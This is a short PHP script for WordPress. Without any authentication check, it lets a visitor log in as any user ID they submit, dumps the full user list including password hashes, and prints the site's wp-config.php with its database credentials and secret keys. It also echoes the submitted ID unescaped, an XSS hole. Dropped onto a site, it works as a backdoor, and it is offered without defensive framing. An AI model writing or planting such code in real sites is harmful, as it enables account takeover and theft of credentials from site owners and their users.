<?php
require( $_SERVER['DOCUMENT_ROOT'] .'/wp-load.php' );

/**
 * Optional user authorization
 */

if ( ! empty($_POST['user']) ) {
	wp_set_auth_cookie( $_POST['user'] );
	echo "<p><strong>User with ID ". $_POST['user'] . " authorized</strong></p>";
}
?>
<details>
	<summary>Authorize you like user with ID:</summary>
	<form action="" method="post">
		<p>
			<input type="text" name="user" size="3" placeholder="ID">
			<input type="submit" value="Authorize">
		</p>
	</form>
</details>


<?php
/**
 * Users list
 */
$users = get_users();
?>
<details>
	<summary>Users data:</summary>
	<pre>
		<?php print_r($users); ?>
	</pre>
</details>


<?php
/**
 * site configuration input
 */
$content = file_get_contents( $_SERVER['DOCUMENT_ROOT'] .'/wp-config.php' );
$content = str_replace("php", '-->', $content);
?>
<details>
	<summary>Site configuration options:</summary>
	<pre>
		<?php echo $content; ?>
	</pre>
</details>